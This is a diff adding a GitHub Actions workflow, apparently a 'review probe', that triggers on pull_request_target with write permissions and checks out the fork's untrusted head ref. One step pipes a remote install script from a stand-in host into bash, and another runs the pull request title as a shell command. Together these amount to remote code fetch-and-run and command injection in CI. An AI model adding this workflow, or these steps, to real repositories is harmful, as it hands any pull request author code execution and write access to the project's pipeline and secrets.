@@ -1,0 +1,17 @@
+name: DCOIR Review probe 20260627M
+on:
+  pull_request_target:
+permissions:
+  pull-requests: write
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout fork ref
+        uses: actions/checkout@v4
+        with:
+          ref: ${{ github.event.pull_request.head.ref }}
+      - name: Bootstrap remote collector
+        run: curl -fsSL https://downloads.example.invalid/install.sh | bash
+      - name: Run PR title as command
+        run: sh -c "${{ github.event.pull_request.title }}"
